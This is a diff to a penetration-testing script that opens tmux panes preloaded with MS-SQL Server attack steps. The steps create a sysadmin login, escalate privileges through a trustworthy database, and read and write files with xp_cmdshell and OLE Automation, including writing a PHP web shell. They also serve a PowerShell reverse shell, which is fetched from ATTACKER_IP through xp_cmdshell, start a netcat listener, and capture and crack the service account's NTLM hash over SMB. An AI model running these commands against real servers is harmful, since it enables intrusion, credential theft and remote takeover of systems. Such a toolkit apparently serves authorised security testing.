@@ -2417,7 +2417,7 @@ cd $folderProject
 
 cd $folderProjectAuthN
 # GDB Server
-tmux new-window -t PT:26 -n '[1443] MS-SQL Server: verify credentials, access DB, extract usefull info'
+tmux new-window -t PT:26 -n '[1443] MS-SQL: verify credentials, access DB, extract usefull info'
 tmux split-window -v -t PT:26.0
 tmux resize-pane -t PT:26.0 -y 3
 tmux split-window -v -t PT:26.1
@@ -2474,8 +2474,32 @@ tmux select-pane -t "27.10"
 tmux split-window -h -t "27.10"
 tmux split-window -h -t "27.10"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:27.0 "# MS-SQL: " Enter
-tmux send-keys -t PT:27.0 ""
+tmux send-keys -t PT:27.0 "printf \"\n# Create sysadmin with sp_addsrvrolemember:\n\n# SQL> CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'\n# SQL> EXEC sp_addsrvrolemember 'hacker', 'sysadmin'\n\" " Enter
+tmux send-keys -t PT:27.0 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.1 "printf \"\n# Create sysadmin with trustworthy database:\n\n# Find databases ownership\n# SQL> SELECT name,suser_sname(owner_sid) FROM sys.databases\n# Find trustworthy database\n# SQL> SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;\n# Find roles over the selected trustworthy database\n# SQL> USE <trustworthy_db>\n# SQL> SELECT rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)\n# If you find you are db_owner of a trustworthy database you can privesc\n# SQL> USE <trustworthy_db>\n# SQL> CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember  'USERNAME','sysadmin'\n# Execute stored proceure to add your user to sysadmin role\n# SQL> USE <trustworthy_db>\n# SQL> EXEC sp_elevate_me\n# Verify your user is a sysadmin\n# SQL> SELECT is_srvrolemember('sysadmin')\n\n\" " Enter
+tmux send-keys -t PT:27.1 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.2 "printf \"\n# Read a File with xp_cmdshell:\n\n# Activate xp_cmdshell\n# SQL> EXEC sp_configure 'show advanced options', 1;\n# SQL> RECONFIGURE;\n# SQL> EXEC sp_configure 'xp_cmdshell', 1;\n# SQL> RECONFIGURE;\n# Read File with:\n# SQL> EXEC xp_cmdshell 'dir C:\\my\\directory';\n# SQL> EXEC xp_cmdshell 'type C:\\my\\directory\\myFile.txt';\n\n\" " Enter
+tmux send-keys -t PT:27.2 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.3 "printf \"\n# Read a File with xp_dirtree:\n\n# SQL> xp_dirtree c:\inetpub\wwwroot\n\n\" " Enter
+tmux send-keys -t PT:27.3 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.4 "printf \"\n#  Read a File with OPENROWSET:\n\n# SQL> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n\n\" " Enter
+tmux send-keys -t PT:27.4 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.5 "printf \"\n# Write File with xp_cmdhsell:\n\n# SQL> DECLARE @cmd SYSNAME;\n# SQL> SET @cmd = 'echo Hello World > C:\my\directory\myFile.txt';\n# SQL> EXEC master..xp_cmdshell @cmd;\n\n\" " Enter
+tmux send-keys -t PT:27.5 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.6 "printf \"\n# Write File with OAMethod:\n\n# SQL> sp_configure 'show advanced options', 1\n# SQL> RECONFIGURE\n# SQL> sp_configure 'Ole Automation Procedures', 1\n# SQL> RECONFIGURE\n# Create a File:\n# SQL> DECLARE @OLE INT\n# SQL> DECLARE @FileID INT\n# SQL> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\n# SQL> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1\n# SQL> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET[\"c\"]);?>'\n# SQL> EXECUTE sp_OADestroy @FileID\n# SQL> EXECUTE sp_OADestroy @OLE\n\n\" " Enter
+tmux send-keys -t PT:27.6 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.7 "MS-SQL from xp_cmdshell to ReverseShell: prepare reverseShell" Enter
+tmux send-keys -t PT:27.7 "sudo cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /var/www/html/shell.ps1 && cd /var/www/html && python3 -m http.server"
+tmux send-keys -t PT:27.8 "MS-SQL from xp_cmdshell to ReverseShell: prepare listener" Enter
+tmux send-keys -t PT:27.8 "rlwrap nc -nlvp 9001"
+tmux send-keys -t PT:27.9 "printf \"\n# MS-SQL from xp_cmdshell to ReverseShell: activate reverseShell\n# Verify if I can execute xp_cmdshell\n# SQL> xp_cmdshell 'whoami'\n# If xp_cmdshell does not work I can try to activate it with:\n# SQL> EXEC sp_configure 'show advanced options', 1\n# SQL> RECONFIGURE\n# SQL> xp_cmdshell 'whoami'\n# Get reverseShell with:\n# SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP:8000/shell.ps1\") | powershell -noprofile'\n# or Get revereShell with:\n# SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP:8000/shell.ps1\")\n# Note:\n# If xp_cmdshell is blacklisted try with\n# DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping zdmagrxjtobmobfzjbqsoevmoes65rtp5.oast.fun' --\n\n\" " Enter
+tmux send-keys -t PT:27.9 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.10 "MS-SQL get mssql account HASH: activate SMB listener" Enter
+tmux send-keys -t PT:27.10 "sudo impacket-smbserver share ./ -smb2support"
+tmux send-keys -t PT:27.11 "printf \"\n# MS-SQL get mssql account HASH: activate SMB call from mssql server\n# SQL> xp_dirtree '\\<attacker_IP>\any\thing'\n# SQL> exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'\n# SQL> exec master..xp_subdirs '\\<attacker_IP>\anything\'\n# SQL> exec master..xp_fileexist '\\<attacker_IP>\anything\'\n\n\" " Enter
+tmux send-keys -t PT:27.11 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
+tmux send-keys -t PT:27.10 "MS-SQL get mssql account HASH: crack mssal account HASH" Enter
+tmux send-keys -t PT:27.10 "hashcat -m 5600 sql.hash.ntlmv2 /usr/share/wordlist/rockyou.txt"
 cd $folderProject
 
 # Attivazione della modalità interattiva
